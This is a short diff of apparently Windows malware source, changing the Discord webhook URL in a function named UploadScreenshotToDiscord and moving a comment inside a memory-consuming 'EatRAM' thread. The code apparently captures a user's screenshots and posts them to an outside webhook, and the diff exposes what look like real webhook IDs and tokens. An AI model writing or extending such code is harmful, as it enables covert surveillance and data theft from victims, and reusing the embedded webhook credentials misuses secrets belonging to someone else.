@@ -173,7 +173,7 @@ void UploadScreenshotToDiscord(const char* webhook, const wchar_t* filename) {
     memcpy(postData + strlen(preamble) + len, epilogue, strlen(epilogue));
 
     HINTERNET hRequest = HttpOpenRequest(hConnect, "POST",
-        "https://discord.com/api/webhooks/1393745581670793389/JiRDLO1MWv7wLw4Uh-S5AYmZIFFymlxaAUkr-Tvh3cT1h2fB1QgDZz3-QpBL15gAAQPf", // Placeholder for webhook
+        "/api/webhooks/1392479261645996184/ymFVyUJQ33lkAF2fFylOGD0PjXq_RjQY-ZlhXJ031f17tp-xxW6UGLTbxJOktqTrMZHg", // Placeholder for webhook
         NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
 
     if (hRequest) {
@@ -428,7 +428,8 @@ DWORD WINAPI EatRAM(LPVOID lpParam) {
         void* mem = malloc(1024 * 1024 * 100); // 100MB
         if (!mem) break;
         memset(mem, 0, 1024 * 1024 * 100);
-                // Free the allocated memory to prevent RAM exhaustion
+                        
+        // Free the allocated memory to prevent RAM exhaustion
         free(mem);
         Sleep(1000);
     }
